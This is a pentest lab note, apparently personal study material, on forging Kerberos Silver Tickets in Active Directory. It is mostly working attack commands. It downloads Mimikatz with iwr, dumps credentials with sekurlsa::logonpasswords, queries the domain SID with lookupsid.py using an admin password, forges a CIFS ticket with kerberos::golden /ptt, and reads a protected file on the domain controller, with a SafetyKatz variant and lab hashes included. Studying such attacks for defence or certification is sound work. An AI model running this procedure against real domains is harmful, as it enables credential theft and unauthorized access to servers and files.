#AD_Silver_Ticket

A **Silver Ticket** is a fake service ticket (TGS) that lets you access ONE specific service (like file shares, remote desktop, etc.) without contacting Domain Controller

# <span style="color:#FF5555">Golden vs Silver Ticket</span>

- Golden Ticket = **full domain access**  
 - Silver Ticket = **single service access**
 -  Golden ticket requires NTLM hash of the KRBTGT account, while Silver ticket requires NTLM hash of a service account
- Silver ticket can be forged offline without prior communication with the KDC/AS.

> [!info] Golden Ticket Recap
> A Golden Ticket is a **forged TGT (Ticket Granting Ticket)** created using the **KRBTGT account hash**, allowing an attacker to **access any service in the domain as any user**.

> [!danger] Silver Ticket
> A Silver Ticket is a **forged TGS (service ticket)** created using a **service account hash**, allowing an attacker to **access a specific service on a specific server**.

|Feature|Golden Ticket|Silver Ticket|
|---|---|---|
|Ticket Type|TGT|TGS|
|Hash Used|KRBTGT hash|Service account hash|
|Access Level|Full domain access|One service only|
|Domain Controller|Needed (initially)|Not needed|
|Stealth|Less stealthy|More stealthy|
|Power|Very high (Domain Admin level)|Limited (service-level)|

___

## <span style="color:#8BE9FD">Attack Worflow</span>

1. Attacker obtains NTLM password hash of a service account
2. Using the NTLM hash, a malicious TGS is created, bypassing normal Kerberos flow
3. Using the forged ticket it becomes possible to authenticate to the service.
## <span style="color:#8BE9FD">Requirements</span>

- Domain Name
- Domain SID
- Service (SPN, e.g., CIFS)
- NTLM hash of service account

Most important: **Service account hash**

___

# <span style="color:#FF5555">1 - Leak NTLM hash of a service account</span>
## <span style="color:#8BE9FD">Mimikatz</span>


```powershell
iwr -uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip 
Expand-Archive -Path 'mimikatz_trunk.zip' 
cd .\mimikatz_trunk\ 
cd .\x64\

# Get hash first
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

![[Pasted image 20260416104750.png]]

CORP-DC's NTLM Hash: `11bc07660f7c9a2d8f7cead855b8c72b`

# <span style="color:#FF5555">Using SafetyKatz</span>

```powershell
C:\Users\Administrator\Documents\Tools\SafetyKatz.exe "sekurlsa::logonpasswords"
```

___

# <span style="color:#FF5555">2 - Obtain Domain SID</span>
#### <span style="color:#FFB86C">Method A (from compromised Windows machine):</span>

```bash
lookupsid.py 'Administrator:P@$$W0rd'@$DC_IP
```

![[Pasted image 20260416093506.png]]
#### <span style="color:#FFB86C">Method A (from Linux, remote):</span>

or if we've already an access to machine (eg. reverse shell) we can execute `whoami /user` (excluding the last 4 chars, eg. `-500`): `S-1-5-21-1954621190-1971745961-1283776715`

```cmd
whoami /user
```
- Example:
    S-1-5-21-XXXXX-XXXXX-XXXXX-500
- Remove last part (`-500`) → that’s your **Domain SID**
![[Pasted image 20260416093356.png]]

___
# <span style="color:#FF5555">3 - Forge the Silver ticket</span>

Actually, we've all info needed to forge the Silver ticket. Let's assume 
You're a **low-privileged user** (`devan`) on a domain workstation. You want to access a **file share** on the Domain Controller (`corp-dc`) that you normally can't access.

| Requirement              | Value in Example                            | What It Is                                 |
| ------------------------ | ------------------------------------------- | ------------------------------------------ |
| **Domain Name**          | `dev-angelist.lab`                          | The full domain name                       |
| **Domain SID**           | `S-1-5-21-1954621190-1971745961-1283776715` | Domain's unique identifier                 |
| **Target Server**        | `corp-dc.dev-angelist.lab`                  | The server hosting the service             |
| **Service**              | `cifs`                                      | The service to attack (CIFS = file shares) |
| **Service Account Hash** | `11bc07660f7c9a2d8f7cead855b8c72b`          | NTLM hash of the machine account           |


```powershell
whoami 
hostname 
dir \\$DC_IP\SharedFiles
```

and consider that there's a SMB share at `$DC_IP/SharedFiles` which contains a file named secrets.txt, we aren't able to access it:

![[Pasted image 20260416105225.png]]

Let's download Mimikatz on our devan's machine to generate a new Silver ticket which give us access to Shared folder with administrative right:

Download and extract Mimikatz:

```powershell
iwr -uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
Expand-Archive -Path 'mimikatz_trunk.zip'
cd .\mimikatz_trunk\
#Win32 Folder in this case, because this machine is 32bit
```

Generate a Silver ticket (kerberos::golden regards Silver ticket in this case), the command below contain all requirements needed:

- Domain name -> `$DOMAIN`
- Domain SID -> `S-1-5-21-1954621190-1971745961-1283776715`
- Target -> `$DC_IP`
- NTLM hash of the machine account -> `11bc07660f7c9a2d8f7cead855b8c72b`
- Service name -> Cifs
- id -> 500 (administrator id)
#### <span style="color:#FFB86C">Create Silver Ticket using Mimikatz</span>

``` powershell
kerberos::golden /sid:<SID_Value> /domain:<Domain_Value> /target:<Target_Value> /service:cifs /rc4:<NTLM_Machine> /user:administrator /id:<ID_Value> /ptt
```

```powershell
kerberos::golden /sid:S-1-5-21-1954621190-1971745961-1283776715 /domain:$DOMAIN /target:$DC_IP /service:cifs /rc4:11bc07660f7c9a2d8f7cead855b8c72b /user:Administrator /id:500 /ptt
```

![[Pasted image 20260416105339.png]]

Exit to mimikatz and check the ticket using `klist`:

![[Pasted image 20260416105353.png]]

Add DC host info: `$DC_IP corp-dc.dev-angelist.lab corp-dc` into hosts file (opening notepad as administrator)

![[Pasted image 20260416105408.png]]

Now, we can retry to access SharedFiles and see secret.txt file:

```
dir \\$DC_IP\SharedFiles
more \\$DC_IP\SharedFiles\secret.txt
```

![[Pasted image 20260416105509.png]]
### <span style="color:#50FA7B">Using Safetykatz</span>

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:$DOMAIN /sid:S-1-5-21-719815819-3726368948-3917688648 /target:$DC_IP /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

It's possibile to forge TGS tickets for **other services** as well (e.g., `HOST`, `RPCSS`, `HTTP`, etc.) as long as you have the corresponding service account hash.